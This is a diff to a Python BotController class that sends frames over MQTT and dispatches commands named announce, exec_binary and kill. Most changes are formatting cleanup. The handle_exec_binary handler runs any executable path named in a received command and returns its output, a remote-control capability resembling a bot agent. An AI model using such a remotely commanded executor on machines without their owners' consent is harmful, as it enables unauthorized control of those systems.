@@ -39,7 +39,6 @@ class BotController:
         """Publish a frame to the MQTT client."""
         self.client.publish(frame)
 
-
     def command_to_type(self, args) -> tuple[int, bytes]:
         """Convert CLI arguments to command type and payload."""
         if args.announce:
@@ -56,13 +55,11 @@ class BotController:
             return CMD_TYPES["exec_binary"], args.exec_binary.encode()
         if args.kill:
             return CMD_TYPES["kill"], b""
-
         raise ValueError("No valid command provided.")
 
     def response_to_type(self, resp) -> int:
         """Convert a response to its type (not implemented)."""
         pass
-
 
     def handle_announce(self, payload: bytes):
         """Handle the announce command."""
@@ -124,7 +121,6 @@ class BotController:
 
         if not os.access(path, os.X_OK):
             return False, b"Permission denied (not executable)"
-
         return True, b""
 
     def handle_exec_binary(self, payload: bytes):
@@ -134,17 +130,15 @@ class BotController:
         ok, err = self._is_executable(path)
         if not ok:
             return RESP_TYPES["error"], err
-
         try:
-            result = subprocess.run(
-                [path],                 
-                capture_output=True,
-                text=False,             
-                timeout=10              
-            )
+            result = subprocess.run([path],                 
+                                    capture_output=True,
+                                    text=False,             
+                                    timeout=10
+                                    )
 
             if result.returncode != 0:
-                return RESP_TYPES["error"], result.stderr or b"Execution failed"
+                return RESP_TYPES["error"], result.stderr 
 
             return RESP_TYPES["ok"], result.stdout
 
@@ -175,7 +169,6 @@ class BotController:
         handler = handlers.get(cmd_type)
         if not handler:
             return RESP_TYPES["error"], b"Unknown command"
-        
         return handler(payload)
 
 class Subscriber:
